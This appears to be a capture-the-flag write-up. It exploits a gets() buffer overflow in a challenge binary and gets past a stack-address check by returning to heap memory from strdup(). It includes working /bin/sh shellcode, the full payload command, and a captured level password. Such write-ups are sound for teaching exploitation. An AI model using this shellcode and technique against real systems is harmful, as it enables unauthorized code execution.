# Level 2 — Buffer Overflow Exploit

## Overview

The binary contains a vulnerability inside the function `p()`.
The program uses `gets()`, which allows a buffer overflow.
However, there is a protection that prevents returning to stack addresses starting with `0xb`.

The goal is to bypass this restriction and execute shellcode.

---

## main Function

```asm
0x0804853f <+0>:     push   %ebp
0x08048540 <+1>:     mov    %esp,%ebp
0x08048542 <+3>:     and    $0xfffffff0,%esp
0x08048545 <+6>:     call   0x80484d4 <p>
0x0804854a <+11>:    leave
0x0804854b <+12>:    ret
```

`main()` only calls `p()`.

---

## p Function

```asm
0x080484d7 <+3>:     sub    $0x68,%esp
0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
0x080484ed <+25>:    call   gets@plt
```

A buffer is allocated at `-0x4c(%ebp)` (76 bytes).
`gets()` reads user input into this buffer without size checking.

---

## Protection

```asm
0x080484fb <+39>:    and    $0xb0000000,%eax
0x08048500 <+44>:    cmp    $0xb0000000,%eax
```

If the return address starts with `0xb`, the program exits.
This prevents jumping to stack memory.

---

## Runtime Information

```bash
gets(0xbffff6fc) = 0xbffff6fc
strdup("") = 0x0804a008
```

Stack address is not usable due to protection.
Heap address from `strdup()` is usable.

---

## Offset Calculation

We send a cyclic pattern to find where EIP is overwritten:

```bash
(gdb) run
Starting program: /home/user/level2/level2
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) info registers eip
eip            0x37634136    0x37634136
```

The value `0x37634136` is used to calculate the exact offset (using the provided resources file or pattern tools).

The offset is determined to be:

```
80 bytes
```

---

## Exploit Strategy

Stack execution is blocked.
We use the heap instead.

`strdup()` copies our input to a heap address:

```
0x0804a008
```

We place shellcode in the buffer and overwrite the return address with this heap address.

---

## Shellcode

```bash
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

This executes:

```
/bin/sh
```

---

## Final Payload

```bash
python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 59 * 'X' + '\x08\x04\xa0\x08'[::-1]" > /tmp/2
```

---

## Exploitation

```bash
cat /tmp/2 - | ./level2
```

---

## Result

```
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

---

## Summary

1. Identify overflow using `gets()`
2. Calculate offset
3. Observe stack protection
4. Use heap via `strdup()`
5. Inject shellcode
6. Overwrite return address
7. Execute shell and retrieve password

---


